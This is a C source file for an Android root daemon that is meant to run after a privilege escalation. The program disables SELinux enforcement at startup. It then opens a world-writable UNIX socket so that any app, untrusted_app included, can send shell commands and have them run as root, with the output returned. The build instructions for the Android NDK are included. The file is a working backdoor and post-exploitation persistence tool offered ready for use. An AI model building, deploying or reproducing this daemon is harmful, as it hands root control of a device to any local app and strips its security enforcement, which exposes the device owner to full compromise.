/*
 * root_daemon.c — resident root daemon (started after a one-shot escalation)
 *
 * Protocol: UNIX domain socket (SOCK_STREAM), plain text, one command per connection.
 *   client connects -> writes the command (may be multi-line / newline-terminated) ->
 *   shutdownOutput -> the daemon reads EOF -> runs it with /system/bin/sh -c -> writes stdout
 *   back -> closes the connection.
 *
 * On startup it first does echo 0 > /sys/fs/selinux/enforce to stay Permissive.
 * The socket file is 0777 so untrusted_app can connect too.
 *
 * Design notes (keep one command from wedging the whole daemon):
 *   - Each connection forks a handler child and the parent returns to accept() at once, so a
 *     hung command does not affect later connections.
 *   - stdout/stderr go to a temp file (not a pipe), avoiding the classic problem where a
 *     backgrounded child inherits the pipe's write end, the reader never sees EOF and the
 *     daemon gets stuck in fgets/pclose.
 *   - A backgrounded (`... &`) payload only delays the handler child's waitpid, but `sh -c`
 *     itself returns after backgrounding, so waitpid reaps it immediately.
 *
 * Build (Android NDK, aarch64):
 *   <NDK>/toolchains/llvm/prebuilt/<host>/bin/aarch64-linux-android<api>-clang \
 *       -O2 -o root_daemon root_daemon.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define SOCK_PATH "/data/local/tmp/root_daemon.sock"
#define CMD_MAX   8192

/* Read the client until EOF and trim the trailing newline. Returns the real length
 * (0 = empty/error). */
static int read_cmd(int fd, char *buf, size_t max) {
    size_t total = 0;
    while (total < max - 1) {
        ssize_t n = read(fd, buf + total, max - 1 - total);
        if (n <= 0) break;
        total += (size_t)n;
    }
    buf[total] = '\0';
    while (total > 0 && (buf[total - 1] == '\n' || buf[total - 1] == '\r')) {
        buf[--total] = '\0';
    }
    return (int)total;
}

/* Handle one connection (runs in the forked handler child). */
static void handle(int c) {
    char cmd[CMD_MAX];
    if (read_cmd(c, cmd, sizeof(cmd)) <= 0) {
        close(c);
        return;
    }

    char tmp[96];
    snprintf(tmp, sizeof(tmp), "/data/local/tmp/root_daemon.out.%d", (int)getpid());

    pid_t pid = fork();
    if (pid < 0) {
        const char *err = "ERR fork\n";
        write(c, err, strlen(err));
        close(c);
        return;
    }

    if (pid == 0) {
        /* child: run the command, stdout/stderr -> temp file, stdin <- /dev/null */
        int out = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0666);
        if (out < 0) _exit(127);
        dup2(out, 1);
        dup2(out, 2);
        close(out);
        int in = open("/dev/null", O_RDONLY);
        if (in >= 0) {
            dup2(in, 0);
            close(in);
        }
        /* Crucial: close every inherited fd (especially the client socket `c`), otherwise a
           backgrounded grandchild holds the connection and the client never sees EOF. */
        for (int fd = 3; fd < 128; fd++) close(fd);
        execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }

    /* parent (handler): wait for `sh -c` to exit. Backgrounded children do not hold this up
     * because `sh -c` returns after `cmd &`. */
    waitpid(pid, NULL, 0);

    int f = open(tmp, O_RDONLY);
    if (f >= 0) {
        char b[4096];
        ssize_t n;
        while ((n = read(f, b, sizeof(b))) > 0) {
            write(c, b, (size_t)n);
        }
        close(f);
    }
    unlink(tmp);
    close(c);
}

int main(void) {
    /* Avoid being killed by SIGPIPE when writing to a disconnected client (inherited across fork). */
    signal(SIGPIPE, SIG_IGN);

    /* Defensively close possibly inherited fds (e.g. a connection fd passed in when started
       from a shell with `setsid ... &`), so the new daemon does not hold an old connection and
       the client never sees EOF. */
    for (int fd = 3; fd < 128; fd++) close(fd);

    /* keep SELinux Permissive */
    system("echo 0 > /sys/fs/selinux/enforce 2>/dev/null");

    int srv = socket(AF_UNIX, SOCK_STREAM, 0);
    if (srv < 0) { perror("socket"); return 1; }

    unlink(SOCK_PATH);
    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCK_PATH, sizeof(addr.sun_path) - 1);

    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return 1;
    }
    chmod(SOCK_PATH, 0777);
    if (listen(srv, 16) < 0) { perror("listen"); return 1; }

    for (;;) {
        int c = accept(srv, NULL, NULL);
        if (c < 0) continue;

        pid_t p = fork();
        if (p == 0) {
            /* handler child */
            close(srv);
            handle(c);
            _exit(0);
        }
        close(c); /* the parent does not need it */

        /* Reap finished handler children without blocking so zombies do not pile up. */
        while (waitpid(-1, NULL, WNOHANG) > 0) { }
    }
    return 0;
}
